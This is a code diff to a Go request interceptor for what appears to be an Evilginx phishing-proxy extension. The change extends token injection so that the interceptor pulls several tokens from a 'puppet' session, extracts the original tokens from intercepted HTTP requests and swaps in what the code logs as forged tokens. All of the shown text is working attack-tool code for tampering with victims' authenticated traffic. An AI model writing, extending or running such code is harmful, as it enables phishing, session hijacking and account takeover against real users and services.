@@ -31,57 +31,92 @@ func (ri *RequestInterceptor) AddTrigger(trigger *PuppetTrigger) {
 	ri.triggers = append(ri.triggers, trigger)
 }
 
+// ClearTriggers removes all triggers
+func (ri *RequestInterceptor) ClearTriggers() {
+	ri.triggers = []*PuppetTrigger{}
+}
+
 // InterceptRequest intercepts and modifies an HTTP request
 func (ri *RequestInterceptor) InterceptRequest(req *http.Request, sessionID string) (*http.Request, bool) {
 	// Check if any trigger matches this request
 	for _, trigger := range ri.triggers {
 		if ri.matchesTrigger(req, trigger) {
-			log.Debug("[INTERCEPTOR] Request matches trigger for token: %s", trigger.Token)
-			
-			// Try to get existing token first (fast path)
-			puppetToken, exists := ri.puppetMaster.GetToken(sessionID, trigger.Token)
-			
-			if !exists {
-				// Token doesn't exist yet, wait for puppet to complete
-				log.Info("[INTERCEPTOR] Token not available, waiting for puppet session...")
-				token, err := ri.puppetMaster.WaitForToken(sessionID, trigger.Token, 30*time.Second)
-				if err != nil {
-					log.Warning("[INTERCEPTOR] Failed to wait for puppet token: %v", err)
-					return req, false
+			// Collect all tokens we need to inject
+			tokensToInject := []string{}
+			if trigger.Token != "" {
+				tokensToInject = append(tokensToInject, trigger.Token)
+			}
+			for _, t := range trigger.Tokens {
+				// Don't add if already added by trigger.Token
+				exists := false
+				for _, et := range tokensToInject {
+					if et == t {
+						exists = true
+						break
+					}
 				}
-				puppetToken = token
+				if !exists {
+					tokensToInject = append(tokensToInject, t)
+				}
 			}
-			
-			// Extract original token from request
-			originalToken, err := ri.extractTokenFromRequest(req, trigger.Token)
-			if err != nil {
-				log.Warning("[INTERCEPTOR] Failed to extract token: %v", err)
-				return req, false
+
+			if len(tokensToInject) == 0 {
+				log.Debug("[INTERCEPTOR] No tokens specified in trigger %s", trigger.Id)
+				continue
 			}
-			
-			log.Info("[INTERCEPTOR] Replacing token %s... with %s...", 
-				shortenToken(originalToken), 
-				shortenToken(puppetToken))
-			
-			// Replace token in request
-			modifiedReq, err := ri.replaceTokenInRequest(req, originalToken, puppetToken)
-			if err != nil {
-				log.Error("[INTERCEPTOR] Failed to replace token: %v", err)
-				return req, false
+
+			log.Debug("[INTERCEPTOR] Request matches trigger %s, needs tokens: %v", trigger.Id, tokensToInject)
+
+			modifiedReq := req
+			anyIntercepted := false
+
+			for _, tokenName := range tokensToInject {
+				// Try to get existing token first (fast path)
+				puppetToken, exists := ri.puppetMaster.GetToken(sessionID, tokenName)
+
+				if !exists {
+					// Token doesn't exist yet, wait for puppet to complete
+					log.Info("[INTERCEPTOR] Token %s not available, waiting for puppet session...", tokenName)
+					token, err := ri.puppetMaster.WaitForToken(sessionID, tokenName, 30*time.Second)
+					if err != nil {
+						log.Warning("[INTERCEPTOR] Failed to wait for puppet token %s: %v", tokenName, err)
+						continue // Try next token if any
+					}
+					puppetToken = token
+				}
+
+				// Extract original token from request
+				originalToken, err := ri.extractTokenFromRequest(modifiedReq, tokenName)
+				if err != nil {
+					log.Warning("[INTERCEPTOR] Failed to extract token %s from request: %v", tokenName, err)
+					continue
+				}
+
+				log.Info("[INTERCEPTOR] Replacing token %s... with forged token %s...",
+					shortenToken(originalToken),
+					shortenToken(puppetToken))
+
+				// Replace token in request
+				newReq, err := ri.replaceTokenInRequest(modifiedReq, originalToken, puppetToken)
+				if err != nil {
+					log.Error("[INTERCEPTOR] Failed to replace token %s: %v", tokenName, err)
+					continue
+				}
+				modifiedReq = newReq
+				anyIntercepted = true
 			}
-			
-			// If trigger has abort, we need to handle differently
-			if trigger.AbortOriginal {
-				// In practice, you'd return a modified request and signal to abort original
-				// This depends on how Evilginx handles request modification
-				log.Debug("[INTERCEPTOR] Trigger configured to abort original request")
+
+			if anyIntercepted {
+				// If trigger has abort, we might signal differently, but for now we just log
+				if trigger.AbortOriginal {
+					log.Debug("[INTERCEPTOR] Trigger configured to abort original request (not fully implemented)")
+				}
+				log.Success("[INTERCEPTOR] Successfully injected %d tokens into request", len(tokensToInject))
+				return modifiedReq, true
 			}
-			
-			log.Success("[INTERCEPTOR] Token successfully injected into request")
-			return modifiedReq, true
 		}
 	}
-	
+
 	return req, false
 }
 
